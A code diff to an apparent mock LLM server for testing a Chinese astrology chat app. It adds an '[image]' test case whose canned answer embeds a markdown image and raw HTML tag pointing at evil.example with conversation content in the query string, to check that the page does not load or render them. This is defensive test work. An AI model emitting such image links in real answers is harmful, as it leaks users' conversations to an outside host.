@@ -12,6 +12,7 @@ import type { AddressInfo } from 'node:net';
  * - 最后一问里的 `[drop]`：直接断开连接（网络层失败）。
  * - 最后一问里的标记：`[401]` `[429]` `[500]` 对应状态码；`[cors]` 响应不带跨域头（浏览器里是网络错误）；
  *   `[notools]` 在请求带工具时报「不支持工具调用」；`[slow]` 慢慢地流出 30 段；`[table]` 回答里带一张宽表；
+ *   `[image]` 回答里带一张站外图片与一段原始 HTML（网页不该加载、不该渲染）；
  *   `[topic]` 先查主题选宫；`[plain]` 不查工具直接回答。
  * - 其余：请求带工具且还没有工具结果时，先调 `ziwei_get_horoscope`（2026 年），拿到结果后流式回答。
  */
@@ -35,6 +36,8 @@ const MODELS = [
 
 const ANSWER = ['能动，', '但更适合在现在的专业里往上走一步。', '\n\n今年流年命宫落在午，', '自己拿主意的力量很足。'];
 const TABLE = '\n\n| 年份 | 流年 | 命宫 | 四化 | 留意 | 说明 |\n|---|---|---|---|---|---|\n| 2026 | 丙午 | 午 | 同梁昌廉 | 七月 | 工作上对自己的要求会一下子收紧，规章、合同、人事上的细节容易卡住 |';
+
+const IMAGE = '\n\n![泄露](https://evil.example/leak.png?q=对话内容) <img src="https://evil.example/raw.png"> [出处](https://example.com/a)';
 
 const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
 
@@ -80,7 +83,9 @@ function plan(text: string, body: Record<string, unknown>) {
         : { name: 'ziwei_get_horoscope', input: { target: { year: 2026 } } }
       : null;
   const slow = text.includes('[slow]');
-  const pieces = slow ? Array.from({ length: 30 }, (_, i) => `第 ${i + 1} 段。`) : [...ANSWER, ...(text.includes('[table]') ? [TABLE] : [])];
+  const pieces = slow
+    ? Array.from({ length: 30 }, (_, i) => `第 ${i + 1} 段。`)
+    : [...ANSWER, ...(text.includes('[table]') ? [TABLE] : []), ...(text.includes('[image]') ? [IMAGE] : [])];
   return { call, pieces, gap: slow ? 150 : 15 };
 }
 
